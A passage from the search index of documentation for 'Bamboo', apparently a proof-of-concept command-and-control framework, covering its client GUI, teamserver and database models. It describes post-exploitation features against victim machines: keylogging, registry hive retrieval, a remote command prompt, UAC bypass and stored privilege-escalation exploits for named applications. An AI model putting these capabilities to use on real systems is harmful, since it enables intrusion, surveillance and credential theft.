prompted to connect to the server. Once connected, the window will hide the frame containing the inputs for server connection, and make the frame containing the inputs for user login visible. If the user has successfully logged on before, the username section will be filled in from info.txt.</p> <p>A window containing the Bamboo logo and a line of trivia will then appear before destroying itself after 2.5 seconds. Similar to the previous window, this is also a separate CTk main loop from the main application, and is run in a subprocess with the subprocess module. Once this window is destroyed, the main application will appear.</p> <p>The following section will explain more about the main application, as well as the individual widgets.</p>"},{"location":"Client/GUI/widgets.html","title":"Widgets","text":""},{"location":"Client/GUI/widgets.html#description","title":"Description","text":"<p>The main application is where the user will interact with the rest of the framework. In the main application, all widgets have been positioned using the grid() function, and thus can be resized to the user's liking. The font size will also adjust accordingly depending on the height of tabs widget. The main application consists of 5 main widgets: the menu bar, the display frame, the websocket logs and the tabs.</p>"},{"location":"Client/GUI/widgets.html#menu-bar","title":"Menu Bar","text":"<p>The menu bar is made using the tk.Menu() widget, and contains 6 menu options. Each menu option has its own dropdown, where each dropdown option will either display a table in the display frame, or open a new Toplevel, depending on the function it is bound to.</p> <p>For the displaying of tables, all follow the same general logic. The items in the display frame will first be cleared with grid.forget(), before retrieving required information from MongoDB and generating the table using CTkLabels and the grid() function. </p>"},{"location":"Client/GUI/widgets.html#bamboo","title":"BAMBOO","text":"<p>BAMBOO only has 1 dropdown option: bamboo. </p> <p>Clicking on this will clear the items in the display frame, and display the Bamboo logo, which is a CTkImage object, and a label telling users to click on the menu bar to display other items.</p>"},{"location":"Client/GUI/widgets.html#agents","title":"Agents","text":"<p>Agents has only has 1 dropdown option: Display Agents. </p> <p></p> <p>Clicking on this will clear the items in the display frame, and retrieve the agents information from the database using the display_agent() function defined in the agent_commands() class. This will call an API, which will either return a list containing the table headers and agent information, or a string '[x] No agent is connected'.</p> <p>If the agents table is returned, a table displaying the agents will then be generated, using CTkLabels and information from the table. Above the table and separated by a ttk.Separator widget is where users can kill agents using a dropdown list, which has been dynamically filled with the agent identifiers using the information from the table. Clicking on the Confirm button will call the delete_agent function, which will then kill the selected agent. If successful, the table will refresh.</p> <p>However, if '[x] No agent is connected' is returned, a label prompting users to run an agent will instead be displayed.</p>"},{"location":"Client/GUI/widgets.html#users","title":"Users","text":"<p>Users has 2 dropdown options: Display Users and Add User.</p> <p></p> <p>Clicking on Display Users will clear the items in the display frame, and retrieve the users information from the database. This is done by calling the /handler/view_users API using the show_users() method defined in the user_commands() class.</p> <p>A list containing the table headers and a nested list containing the information of each user will then be returned. Using this, a table will then be generated and displayed in the display frame. The user's status will be coloured either green or red if they are online or offline, respectively.</p> <p>Above the table and separated by a ttk.Separator widget, users can also delete other users using the dropdown list, which has been dynamically generated using the user information retrieved. Clicking on confirm will call the delete_user function, which will get the selected user and call the /handler/delete_user API if the selected user is a valid user. Upon success, the table will refresh.</p> <p>Clicking on Add User will open up a new Toplevel window, where users can register new users. </p>"},{"location":"Client/GUI/widgets.html#exploits","title":"Exploits","text":"<p>Exploits has 3 dropdown options: Display Exploits, Add Exploit and Modify Exploit.</p> <p></p> <p>Clicking on Display Exploits will clear the items in the display frame and retrieve the exploits information from the database. This is done by calling the /exploit/view_all API using the display_exploit() method defined in the exploit_commands() class. </p> <p>If there are exploits in the database, it will return a list containing the table headers and a nested list containing the information of each exploit. Using this, a table will then be generated and displayed in the display frame. Users are recommended to increase the window size to see the table clearly.</p> <p>Above the table and separated by a ttk.Separator widget, users can delete exploits using the dropdown list, which has been dynamically generated using the exploits information retrieved. Clicking on confirm will call the delete_exploit() function, which will get the selected exploit and call the /exploit/delete API if the selected exploit is valid. Upon success, the table will refresh.</p> <p>If there are no exploits in the database, a 'No exploits in DB' string will be returned. The display frame will then display a label telling users to add exploits into the database.</p> <p>Clicking on Add Exploit will open up a new Toplevel window, where users can add their own exploits. Files added must be an .exe file, and depending on the options selected, other options will be unhidden. Once there is a valid configuration, users can click on Add Exploit to add their exploit.</p> <p>Clicking on Modify Exploit will open up a new Toplevel window, where users are able to edit the existing exploits. </p>"},{"location":"Client/GUI/widgets.html#view-files","title":"View files","text":"<p>View files has 3 dropdown options: ... from Enumerate, ... from Keylog and ... from Retrieve.</p> <p>Clicking on either of the 3 will open up the default file explorer in the /handler/postexp/enumerate, /handler/postexp/keylog or /handler/postexp/retrieve path respectively.</p>"},{"location":"Client/GUI/widgets.html#help","title":"Help","text":"<p>Help has 2 dropdown options: Help and Technical Doc.</p> <p>Clicking on Help will open a new Toplevel window containing the commands.</p> <p>Clicking on Technical Doc will open the document in the browser.</p>"},{"location":"Client/GUI/widgets.html#display-frame","title":"Display Frame","text":"<p>The display frame is made using the CTk.CTkFrame() widget, and is used to display information using 'tables' generated with CTk.CTkLabel() widgets.</p> <p>Upon launching the main application, the default homescreen for the display frame has the Bamboo logo and text telling the user to click on the main menu to display items there.</p> <p>Depending on the menu option clicked, the display frame can either display a table of agents, users or exploits. To see the logic for this, refer to the above section.</p>"},{"location":"Client/GUI/widgets.html#websocket-logs","title":"Websocket Logs","text":"<p>The websocket logs is a CTk.CTkTextbox() widget, and contains messages and/or logs from the Bamboo Teamserver, including messages from the teamchat, as well as any agent connection. Its class is defined in /handler/gui/widgets/ws_textBox.py.</p> <p>It checks for messages from the Bamboo Teamserver using a websocket process that runs alongside the main process using multiprocessing, and a recursive function that calls itself every 1000ms. This function will check if a message has been received, and will remove the ANSI coding before inserting it into the websocket logs.</p>"},{"location":"Client/GUI/widgets.html#tabs","title":"Tabs","text":"<p>At the bottom of the widget is a CTk.CTkTabview() widget, which by default contains 2 tabs, TEAMCHAT and MAIN CONSOLE. It can have up to 7 additional tabs for running agents. The class is defined in /handler/gui/widgets/tabs.py.</p>"},{"location":"Client/GUI/widgets.html#teamchat","title":"Teamchat","text":"<p>The teamchat contains messages from other users. It will periodically check for new messages in the teamchat.txt file using polling. If there are any new messages, it will remove the ANSI encoding and insert the message into the console_output CTk.CTkTextbox() widget. </p> <p>Users can also send messages through this tab. Users can type their messages in the CTk.CTkEntry() widget and press enter to send a chat message. </p>"},{"location":"Client/GUI/widgets.html#main-console","title":"Main Console","text":"<p>The main console is mainly where users will run commands. It consists of two widgets, console_output, a CTk.CTkTextbox() widget where the commands entered and the results will appear, and console_input, a CTk.CTkEntry() widget where users can enter commands. The class is defined under /handler/gui/widgets/console.py.</p> <p>Depending on the commands entered by the user, the application will run different functions and call different APIs, similar to the CLI. The available commands can be found below. </p>"},{"location":"Client/GUI/widgets.html#help_1","title":"help","text":"<p>Usage: <code>help</code></p> <p>Shows all possible commands in console_output.</p>"},{"location":"Client/GUI/widgets.html#exit-quit","title":"exit / quit","text":"<p>Usage: <code>exit</code> or <code>quit</code></p> <p>Quits the client, and terminates the websocket connection. The user will then be set as offline.</p>"},{"location":"Client/GUI/widgets.html#clear","title":"clear","text":"<p>Usage: <code>clear</code></p> <p>Clears the chat log and teamchat. This will clear the teamchat.txt file.</p>"},{"location":"Client/GUI/widgets.html#users_1","title":"users","text":"<p>Usage: <code>users</code></p> <p>Displays the table of users. The information is retrieved from the database using the show_users() method defined in the user_commands class, and then displayed in console_output using tabulate.</p>"},{"location":"Client/GUI/widgets.html#register","title":"register","text":"<p>Usage: <code>register</code></p> <p>Opens a CTk.CTkToplevel window where users can register new users. This Toplevel window is defined in /handler/gui/func/run_register.py.</p> <p>The text in console_output will reflect whether the user closed the window, or successfully registered another user. </p>"},{"location":"Client/GUI/widgets.html#remove","title":"remove","text":"<p>Usage: <code>remove [user]</code></p> <p>Removes the user given. The application will call the corresponding API and attempt to delete the user. The result in console_output will reflect whether or not it is successful.</p> <p>If the user did not put a username, an error message informing the user of the correct usage will be printed.</p>"},{"location":"Client/GUI/widgets.html#display","title":"display","text":"<p>Usage: <code>display</code></p> <p>Displays all connected agents. The application will call the corresponding API and retrieve the agent information, and return it as <code>status</code>. If <code>status</code> contains the table, it will be displayed in console_output using tabulate; otherwise, '[x] No agent is connected' will be printed.</p>"},{"location":"Client/GUI/widgets.html#use","title":"use","text":"<p>Usage: <code>use [agent_identifier]</code></p> <p>Opens a new tab for the given agent identifier. Up to 7 tabs can be opened using this command. If there are already 7 agent identifier tabs open, or if the agent is already in use or does not exist, or an agent identifier was not given, the corresponding error message will be printed in console_output.</p> <p>More information about the commands that can be used in the agent identifier tabs can be found in the next section.</p>"},{"location":"Client/GUI/widgets.html#kill","title":"kill","text":"<p>Usage: <code>kill [agent_identifier]</code></p> <p>Kills the agent given. The application will call the corresponding API and attempt to kill the given agent. The result will then be printed in console_output. If no agent identifier was given, an error message will be printed.</p>"},{"location":"Client/GUI/widgets.html#exp","title":"exp","text":"<p>Usage: <code>exp</code></p> <p>Displays all exploits. The corresponding API will be called and the exploits information will be retrieved, and returned as <code>exploit_table</code>. If <code>exploit_table</code> is not 'No exploits in DB', the information will be displayed in console_output using tabulate.</p>"},{"location":"Client/GUI/widgets.html#add","title":"add","text":"<p>Usage: <code>add</code></p> <p>Opens a new CTk.CTkToplevel window where users can add their own exploits. This toplevel window is defined in /handler/gui/func/run_add.py.</p> <p>The exploit's file must be an .exe. Other options for the exploit can be chosen, and will differ based on the selections chosen.</p>"},{"location":"Client/GUI/widgets.html#delete","title":"delete","text":"<p>Usage: <code>delete [exploit_name]</code></p> <p>Deletes the given exploit. The application will call the corresponding API and attempt to delete the given exploit. The result will then be printed in console_output. If no exploit name was given, an error message will be printed.</p>"},{"location":"Client/GUI/widgets.html#modify","title":"modify","text":"<p>Usage: <code>modify</code></p> <p>Opens a new CTk.CTkToplevel window where users can modify existing exploits. This toplevel window is defined in /handler/gui/func/run_modify.py.</p> <p>Modifying exploits must follow the same rules as adding an exploit, such as files must be .exe, etc.</p>"},{"location":"Client/GUI/widgets.html#agent-identifier-tabs","title":"Agent Identifier Tabs","text":"<p>Agent identifier tabs can be opened using the <code>use [agent_identifier]</code> command in MAIN CONSOLE. Only 7 agent identifier tabs can be opened at any one time on a client.</p> <p></p> <p>Clicking on an agent identifier tab will show three buttons: Start Enumerating, Toggle Keylog and Get Registry Hives. These buttons are only shown when the current tab is an agent identifier tab, and will not appear in TEAMCHAT or MAIN CONSOLE. As there is no tab-changed event for CTk, this is done using a recursive function that checks for the current tab every 100ms and hides or shows the buttons accordingly.</p> <p>The three buttons, as well as the commands that can only be used when an agent is in use, can be found below. </p>"},{"location":"Client/GUI/widgets.html#stop","title":"stop","text":"<p>Usage: <code>stop</code></p> <p>Stops using the agent. This will close the tab, but will not kill the agent.</p>"},{"location":"Client/GUI/widgets.html#info","title":"info","text":"<p>Usage: <code>info</code></p> <p>Shows the information of the current agent. The corresponding API is called, and the information of the current agent is retrieved from the database. The information will then be displayed in console_output using tabulate.</p>"},{"location":"Client/GUI/widgets.html#exploit","title":"exploit","text":"<p>Usage: <code>exploit</code></p> <p>Opens a new CTk.CTkToplevel window where users can select the exploit to run. This toplevel window is defined in /handler/gui/func/run_exploit.py.</p>"},{"location":"Client/GUI/widgets.html#cmd","title":"cmd","text":"<p>Usage: <code>cmd</code></p> <p>Opens a command prompt for the current agent.</p>"},{"location":"Client/GUI/widgets.html#enum-start-enumerating","title":"enum / Start Enumerating","text":"<p>Usage: <code>enum</code> or click on Start Enumerating</p> <p>Enumerates on the victim machine. Files can be found under /handler/postexp/enumerate.</p>"},{"location":"Client/GUI/widgets.html#postexp-toggle-keylog-get-registry-hives","title":"postexp / Toggle Keylog &amp; Get Registry Hives","text":"<p>Usage: <code>postexp [keylog|retrieve]</code> or click on Toggle Keylog/Get Registry Hives</p> <p>Runs a post-exploitation method based on the method given. Entering <code>keylog</code> as the method or clicking on Toggle Keylog will start/stop logging keystrokes, while entering <code>retrieve</code> as the method or clicking Get Registry Hives will retrieve the registry hives.</p> <p>Files can be found under /handler/postexp/keylog and /handler/postexp/retrieve.</p>"},{"location":"Client/GUI_Command_Classes/gui_commands.html","title":"GUI Commands","text":"<p>This is not a user guide, this is the documentation for GUI Commands. GUI Commands are a set of classes that works between the commands and the Bamboo Client GUI. As Bamboo Client GUI was built on top of Bamboo Client CLI, the GUI will invoke the functions in /handler/gui/commands first. The functions located in there will then invoke the functions in /handler/commands to request for specific APIs from the Bamboo Teamserver and will then return messages accordingly. The additional step is required to ensure that the statements are printed in the GUI itself instead of the terminal running in the background. However, there are some cases where the CLI does not require a certain action, or an entire new command needs to be created as the command is only suited for the CLI. When this happens, GUI Commands will directly call the server endpoint instead.</p> <p>GUI Commands are split into 5 different classes that were grouped together according to their use cases and domains. To find out more about each command, click on the command or visit the Commands page.</p> Class Description agent_commands Commands that involves Agents exploit_commands Commands that involves Exploits general_commands General commands postexp_commands Commands that involves Post Exploits user_commands Commands that involves Users"},{"location":"Client/GUI_Command_Classes/gui_commands.html#agent_commands","title":"agent_commands","text":"Functions GUI Command Command Called Arguments display_agent <code>display</code> handler_func.display Null use_agent <code>use [agent]</code> handler_func.use_agent agent_identifier remove_agent <code>kill [agent]</code> handler_func.remove_agent agent_identifier stop_agent <code>stop</code> handler_func.stop_agent agent_in_use info_status <code>info</code> handler_func.info_status agent_in_use checkStatus <code>exploit</code>, <code>cmd</code>, <code>postexp</code> func.check_agent_status agent_in_use cmd <code>cmd</code> commands.command_prompt agent_identifier, cmd"},{"location":"Client/GUI_Command_Classes/gui_commands.html#exploit_commands","title":"exploit_commands","text":"Functions GUI Command Command Called Arguments display_exploit <code>exp</code> exploits.view_exploits Null delete_exploit <code>delete [exploit]</code> exploits.del_exploit exploit_name gather_exploits <code>modify</code>, <code>exploit</code> Endpoint: /exploit/view_all jwt_token stop_process <code>exploit</code> Endpoint: /exploit/quit agent_identifier send_exploit_config <code>exploit</code> Endpoint: /exploit/send_config need_donut, agent_identifier, exploit_to_use, evasion_method, app_version, uac_bypass, donut_config, donot_for add_exploit <code>add</code> Endpoint: /exploit/add exploit_path, exploit_name, app_version, LPE_start, LPE_end, uac_bypass, d2d, inj, dropfile modify_exploit <code>modify</code> Endpoint: /exploit/modify_gui modified_exploit_name, new_name, new_app_version, new_LPE_start, new_LPE_end, new_uac_bypass, new_d2d, new_inj, new_dropfile"},{"location":"Client/GUI_Command_Classes/gui_commands.html#general_commands","title":"general_commands","text":"Functions GUI Command Command Called Arguments show_help <code>help</code> Null Null exiting <code>exit</code>/<code>quit</code> Null Null clear <code>clear</code> Null Null"},{"location":"Client/GUI_Command_Classes/gui_commands.html#postexp_commands","title":"postexp_commands","text":"Functions GUI Command Command Called Arguments enum <code>enum</code> commands.enum agent_identifier, priv_lvl postexp_gui <code>postexp [method]</code> commands.postexp agent_identifier, method, priv_lvl"},{"location":"Client/GUI_Command_Classes/gui_commands.html#user_commands","title":"user_commands","text":"Functions GUI Command Command Called Arguments show_users <code>users</code> handler_func.view_users Null register_user <code>register</code> handler_func.register_user new_user, new_pw delete_user <code>remove [handler]</code> handler_func.delete_user del_username"},{"location":"Teamserver/global_variables.html","title":"Global Variables","text":"<p>This page covers global variables used in the Bamboo Teamserver and Bamboo Client GUI. A global variable is typically used to store and share information across different parts of the application. This helps maintain consistent states or configurations that need to be accessible from multiple components.</p>"},{"location":"Teamserver/global_variables.html#global-variables-bamboo-teamserver","title":"Global Variables - Bamboo Teamserver","text":"Variable Type Description Usage ws_handler Dictionary Whenever a Bamboo Client logs in and connects via a WebSocket, the Bamboo Teamserver will record the username as the key and the WebSocket as the value Enables the Bamboo Teamserver to broadcast messages to all connected Bamboo Clients ws_agent Dictionary Whenever a Bamboo Agent connects via WebSocket, the Bamboo Teamserver will record its agent identifier as the key and the WebSocket as the value Enables the Bamboo Teamserver to broadcast commands agent_response Dictionary For the <code>cmd</code> command, Bamboo Agent's response is recorded in this dictionary Enables Bamboo Client to receive the response keylog_status Dictionary For the <code>postexp keylog</code> command, the Bamboo Teamserver will record down the status of each Bamboo Agent keylog process (start/stop) Determines if a Bamboo Client is starting or stopping a keylog process"},{"location":"Teamserver/global_variables.html#global-variables-bamboo-client-gui","title":"Global Variables - Bamboo Client GUI","text":"Variable Type Description Usage jwt_token String Stores the JSON Web Token (JWT) in a global variable Enables Bamboo Client GUI to access the JWT when needed ws_process String Stores the WebSocket process Enables Bamboo Client GUI to terminate the WebSocket process easily"},{"location":"Teamserver/misc_func.html","title":"Miscellaneous Functions","text":"<p>The functions below shows all the miscellaneous functions that can be found in Bamboo Teamserver.</p> <p></p>"},{"location":"Teamserver/misc_func.html#generate_unique_id","title":"generate_unique_id","text":""},{"location":"Teamserver/misc_func.html#description","title":"Description","text":"<p>Used to generate Bamboo Agent an agent identifier. Using the library <code>random</code>, Bamboo Teamserver will generate a random 8 characters string that can consist of lowercase alphabets and numbers.</p>"},{"location":"Teamserver/misc_func.html#function-argument","title":"Function Argument","text":"<p>This function does not require any arguments</p> <p></p>"},{"location":"Teamserver/misc_func.html#arguments","title":"arguments","text":""},{"location":"Teamserver/misc_func.html#description_1","title":"Description","text":"<p>Allows user to run Bamboo Teamserver using a different IP Address and/or ports. With this function, users can add arguments when running.</p> <pre><code>python teamserver.py -ip 192.168.39.7 -p 1122\npython teamserver.py --host 32.222.104.31 --port 9999\n</code></pre>"},{"location":"Teamserver/misc_func.html#function-argument_1","title":"Function Argument","text":"<p>This function does not require any arguments</p> <p></p>"},{"location":"Teamserver/misc_func.html#timestamp","title":"timestamp","text":""},{"location":"Teamserver/misc_func.html#description_2","title":"Description","text":"<p>Widely used in Bamboo Teamserver when generating printed logs with timestamp.</p>"},{"location":"Teamserver/misc_func.html#function-argument_2","title":"Function Argument","text":"<p>This function does not require any arguments</p> <p></p>"},{"location":"Teamserver/misc_func.html#initialise_db","title":"initialise_db","text":""},{"location":"Teamserver/misc_func.html#description_3","title":"Description","text":"<p>Used when Bamboo Teamserver is starting up to initialise Bamboo Teamserver. Users can edit this function before start up to change the host of MongoDB.</p>"},{"location":"Teamserver/misc_func.html#function-argument_3","title":"Function Argument","text":"<p>This function does not require any arguments</p> <p></p>"},{"location":"Teamserver/misc_func.html#update_agentdb","title":"update_agentDB","text":""},{"location":"Teamserver/misc_func.html#description_4","title":"Description","text":"<p>Runs in the background of Bamboo Teamserver every 1000 seconds. This function helps to clean up the 'dead' registered Bamboo Agents. Every time it runs, it will update the status of each Bamboo Agent accordingly and if the registered Bamboo Agent is 'dead' for 100 seconds already, it will be removed from the database.</p>"},{"location":"Teamserver/misc_func.html#function-argument_4","title":"Function Argument","text":"<p>This function does not require any arguments</p>"},{"location":"Teamserver/overview.html","title":"Overview","text":"<p>This section of the document includes information pertaining to the Bamboo Teamserver.  </p> <p>Below is the file structure of the Bamboo Teamserver.</p> <pre><code>teamserver\n\u251c\u2500\u2500 api\n\u2502   \u251c\u2500\u2500 agent.py\n\u2502   \u251c\u2500\u2500 authentication.py\n\u2502   \u251c\u2500\u2500 exploit.py\n\u2502   \u251c\u2500\u2500 handler_func.py\n\u2502   \u2514\u2500\u2500 postexp.py\n\u251c\u2500\u2500 certs\n\u2502   \u251c\u2500\u2500 cert.pem\n\u2502   \u2514\u2500\u2500 key.pem\n\u251c\u2500\u2500 database\n\u2502   \u251c\u2500\u2500 models\n\u2502   \u2502   \u251c\u2500\u2500 agent.py\n\u2502   \u2502   \u251c\u2500\u2500 auth.py\n\u2502   \u2502   \u251c\u2500\u2500 exploit.py\n\u2502   \u2502   \u2514\u2500\u2500 users.py\n\u2502   \u2514\u2500\u2500 db.py\n\u251c\u2500\u2500 exploits\n\u2502   \u251c\u2500\u2500 barracudadrive.exe\n\u2502   \u251c\u2500\u2500 clfs.exe\n\u2502   \u251c\u2500\u2500 drfone.exe\n\u2502   \u251c\u2500\u2500 edrblocker.exe\n\u2502   \u251c\u2500\u2500 filmora.exe\n\u2502   \u2514\u2500\u2500 wacom.exe\n\u251c\u2500\u2500 func\n\u2502   \u251c\u2500\u2500 agent_identifier_gen.py\n\u2502   \u251c\u2500\u2500 arg.py\n\u2502   \u251c\u2500\u2500 datetime.py\n\u2502   \u251c\u2500\u2500 initialise_db.py\n\u2502   \u2514\u2500\u2500 update_agentDB.py\n\u251c\u2500\u2500 shellcode\n\u2502   \u251c\u2500\u2500 payload.bin\n\u2502   \u2514\u2500\u2500 payload.txt\n\u251c\u2500\u2500 uac_bypass\n\u2502   \u2514\u2500\u2500 uac_bypass.exe\n\u251c\u2500\u2500 ws\n\u2502   \u2514\u2500\u2500 websocket.py\n\u251c\u2500\u2500 global_vars.py\n\u2514\u2500\u2500 teamserver.py\n</code></pre>"},{"location":"Teamserver/Database/collections.html","title":"Collections","text":""},{"location":"Teamserver/Database/collections.html#database","title":"Database","text":"<p>Bamboo Teamserver uses MongoDB as its database. MongoDB is an unstructured database that stores data in JSON format, which is what Bamboo Client and Bamboo Agent can work easily with. </p> <p>Bamboo Teamserver database is called \"C2-Server\". There are a total of 4 collections, agents, exploits, heartbeats, and user. exploits and user collection should be imported before running while agents and heartbeats collection will be created when certain functions are called.</p>"},{"location":"Teamserver/Database/collections.html#collections_1","title":"Collections","text":"<p>Each collection within the Bamboo Teamserver\"s C2-Server database serves a specific purpose. Below is a detailed description of each collection and the types of data it stores.</p>"},{"location":"Teamserver/Database/collections.html#agents","title":"agents","text":"<p>This collection will be created after the first Bamboo Agent is connected to Bamboo Teamserver. This collection stores all information of connected Bamboo Agents and can be displayed when using the command <code>display</code>.</p> Key Value Type Description Examples agent_identifier String Unique, 8 characters 5zrire9a hostname String Hostname of infected machine bambooComA publicIP String Public IP address of infected machine 132.99.121.23 privateIP String Private IP address of infected machine 172.168.11.69 priv_lvl String Agent starting privilege level (Low, Medium, High, System) Medium"},{"location":"Teamserver/Database/collections.html#example","title":"Example","text":"<pre><code>[\n    {\n        \"agent_identifier\": \"5zrire9a\",\n        \"hostname\": \"bambooComA\",\n        \"publicIP\": \"18.136.14.9\",\n        \"privateIP\": \"172.22.49.221\",\n        \"priv_lvl\": \"Medium\"\n    },\n\n    {\n        \"agent_identifier\": \"3tj0owfy\",\n        \"hostname\": \"bambooComB\",\n        \"publicIP\": \"198.250.6.31\",\n        \"privateIP\": \"192.168.68.102\",\n        \"priv_lvl\": \"System\"\n    }\n]\n</code></pre>"},{"location":"Teamserver/Database/collections.html#models-and-endpoints-related","title":"Models and Endpoints related","text":"<p>The table below shows the models and Endpoints which interacts with this collection.</p> Model Endpoint agents.add_agent /agent/initial_connection/register agents.show_agents /handler_func/agent/display agents.check_agent_identifier /agent/initial_connection/register agents.use_agent /hander_func/handler/use_agent agents.remove_agent /hander_func/handler/remove_agent"},{"location":"Teamserver/Database/collections.html#exploits","title":"exploits","text":"<p>Bamboo offers multiple preloaded exploits and users should import the json file C2-Server.exploits.json for setting up.</p> Key Value Type Description Examples name String Name of exploit wacom.exe app_version String App name and version Wacom Tablet 6.3.45-1 LPE_start String Starting privilege (User/Admin) user LPE_end String Ending privilege (Admin/System) system uac_bypass Boolean If exploit requires uac_bypass false drop-to-disk Boolean If exploit can be drop-to-disk true inject Boolean If exploit can be injected true drop_file String If any dropping of files is required"},{"location":"Teamserver/Database/collections.html#example_1","title":"Example","text":"<pre><code>[\n    {\n        \"name\": \"filmora.exe\",\n        \"app_version\": \"Wondershare Filmora v11\",\n        \"LPE_start\": \"admin\",\n        \"LPE_end\": \"system\",\n        \"uac_bypass\": true,\n        \"drop-to-disk\": true,\n        \"inject\": true,\n        \"drop_file\": \"filmora.exe\"\n    },\n    {\n        \"name\": \"wacom.exe\",\n        \"app_version\": \"Wacom Tablet 6.3.45-1\",\n        \"LPE_start\": \"user\",\n        \"LPE_end\": \"system\",\n        \"uac_bypass\": false,\n        \"drop-to-disk\": true,\n        \"inject\": true,\n        \"drop_file\": \"\"\n    }\n]\n</code></pre>"},{"location":"Teamserver/Database/collections.html#models-and-endpoints-related_1","title":"Models and Endpoints related","text":"<p>The table below shows the models and Endpoints which interacts with this collection.</p> Model Endpoint exploits.view_all /exploits/view_all exploits.add_exploit /exploits/add exploits.del_exploit /exploits/delete exploits.find_one /exploits/exist exploits.modify /exploits/modify exploits.modify_gui /exploits/modify_gui"},{"location":"Teamserver/Database/collections.html#heartbeats","title":"heartbeats","text":"<p>This collection is related to the agents collection. This contains all heartbeat related information of the agent. Bamboo Agents will send heartbeats to the Bamboo Teamserver in intervals to notify the server that it is still \"alive\" and running.</p> Key Value Type Description Examples agent_identifier String Unique, 8 characters 5zrire9a heartbeat Integer Next heartbeat in seconds 8 current_time Date Timestamp of current heartbeat 2024-07-08T17:00:36.778+00:00 expected_time Date Expected timestamp of next heartbeat 2024-07-08T17:00:44.778+00:00 status String Agent status alive"},{"location":"Teamserver/Database/collections.html#example_2","title":"Example","text":"<pre><code>[\n    {\n        \"agent_identifier\": \"5zrire9a\",\n        \"heartbeat\": 8,\n        \"current_time\": 2024-07-08T17:00:36.778+00:00,\n        \"expected_time\": 2024-07-08T17:00:44.778+00:00,\n        \"status\": \"alive\"\n    },\n    {\n        \"agent_identifier\": \"3tj0owfy\",\n        \"heartbeat\": 10,\n        \"current_time\": 2024-07-30T16:38:15.653+00:00\n        \"expected_time\": 2024-07-30T16:38:25.653+00:00,\n        \"status\": \"dead\"\n    }\n]\n</code></pre>"},{"location":"Teamserver/Database/collections.html#models-and-endpoints-related_2","title":"Models and Endpoints related","text":"<p>The table below shows the models and Endpoints which interacts with this collection.</p> Model Endpoint agents.add_heartbeat /agent/initial_connection/register, /agent/heartbeat agents.get_heartbeat /handler_func/agent/display agents.status_dead Automatic function in Bamboo Teamserver that cleans up Bamboo Agent in database agents.find_dead_but_alive Automatic function in Bamboo Teamserver that cleans up Bamboo Agent in database agents.remove_agent /hander_func/handler/remove_agent agents.info_status /handler_func/handler/info_status agents.remove_inactive Automatic function in Bamboo Teamserver that cleans up Bamboo Agent in database authentication.obtain_status /auth/check_agent_status"},{"location":"Teamserver/Database/collections.html#users","title":"users","text":"<p>Bamboo comes with one default user. For users to log in after setting up, users should import the json file C2-Server.user.json for setting up. They can then register new users using the command register.</p> <p>As Bamboo is just a PoC, the password stored in the database will not be encrypted. Users can add in encryption for passwords using bcrypt. The file to edit will be /teamserver/api/authentication.py, under login to encrypt the password that the user entered to try to match, and /teamserver/api/handler_func.py, to upload encrypted password.</p> Key Value Type Description Examples username String Username of user bambooUser password String Password of user adnap status String If the user is online or offline online"},{"location":"Teamserver/Database/collections.html#example_3","title":"Example","text":"<pre><code>[\n    {\n        \"username\": \"bambooUser\",\n        \"password\": \"adnap\",\n        \"status\": \"online\"\n    },\n    {\n        \"username\": \"bambooUserTwo\",\n        \"password\": \"paSswORd@111\",\n        \"status\" \"offline\"\n    }\n]\n</code></pre>"},{"location":"Teamserver/Database/collections.html#models-and-endpoints-related_3","title":"Models and Endpoints related","text":"<p>The table below shows the models and Endpoints which interacts with this collection.</p> Model Endpoint users.view_users /handler_func/handler/view_users users.user_online /auth/login users.user_offline /auth/logout users.register_user /handler_func/handler/register_user users.delete_user /handler_func/handler/delete_user users.find_one /handler_func/handler/register_user auth.login_auth /auth/login"},{"location":"Teamserver/Database/model_agents.html","title":"Model Class - agents","text":"<p>This class contains all models related to Bamboo Agent. Bamboo Teamserver will make use of the functions within this class to find, update, add, and delete Bamboo Agents according to the needs of Bamboo Client. This class will be interacting with the agents collection and the heartbeats collection</p>"},{"location":"Teamserver/Database/model_agents.html#add_agent","title":"add_agent","text":"<p>Add new Bamboo Agent information into the database</p>"},{"location":"Teamserver/Database/model_agents.html#usage","title":"Usage","text":"<pre><code>POST /agent/initial_connection/register\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#description","title":"Description","text":"<p>add_agent is used when a new Bamboo Agent is registered and Bamboo Teamserver wants to insert the new Bamboo Agent information into the <code>collection agents</code></p>"},{"location":"Teamserver/Database/model_agents.html#function-arguments","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent hostname String Hostname if infected machine publicIP String Public IP address of infected machine privateIP String Private IP address of infected machine priv_lvl String Privilege level of Bamboo Agent"},{"location":"Teamserver/Database/model_agents.html#arguments-example","title":"Arguments Example","text":"<pre><code>add_agent(\"5zrire9a\", \"bambooMachine\", \"39.100.49.231\", \"192.168.45.7\", \"medium\")\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#database-method","title":"Database Method","text":"Method Collection Return insert_one agents Null"},{"location":"Teamserver/Database/model_agents.html#insertion-example","title":"Insertion Example","text":"<pre><code>new_agent = {\n    \"agent_identifier\": \"5zrire9a\",\n    \"hostname\": \"bambooMachine\",\n    \"publicIP\": \"39.100.49.231\",\n    \"privateIP\": \"192.168.45.7\",\n    \"Integrity\": \"Medium\"\n}\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#function-return","title":"Function Return","text":"Type Description Dictionary Notify Bamboo Teamserver of status"},{"location":"Teamserver/Database/model_agents.html#return-example","title":"Return Example","text":"<pre><code>{\"status\": \"success\"}\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#show_agents","title":"show_agents","text":"<p>Retrieve all information of registered Bamboo Agent</p>"},{"location":"Teamserver/Database/model_agents.html#usage_1","title":"Usage","text":"<pre><code>POST /handler_func/agent/display\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#description_1","title":"Description","text":"<p>show_agents extracts all registered Bamboo Agent data from the <code>collection agents</code>. It will then loop through all the data and append them into a list, returning the list to Bamboo Teamserver.</p>"},{"location":"Teamserver/Database/model_agents.html#function-arguments_1","title":"Function Arguments","text":"<p>Does not require any arguments</p>"},{"location":"Teamserver/Database/model_agents.html#database-method_1","title":"Database Method","text":"Method Collection Return find agents List of data"},{"location":"Teamserver/Database/model_agents.html#function-return_1","title":"Function Return","text":"Type Description Nested List All Bamboo Agent data"},{"location":"Teamserver/Database/model_agents.html#return-example_1","title":"Return Example","text":"<pre><code>data = [\n    [\n        \"agent_identifier\": \"5zrire9a\",\n        \"hostname\": \"bambooMachine\",\n        \"publicIP\": \"39.100.49.231\",\n        \"privateIP\": \"192.168.45.7\",\n        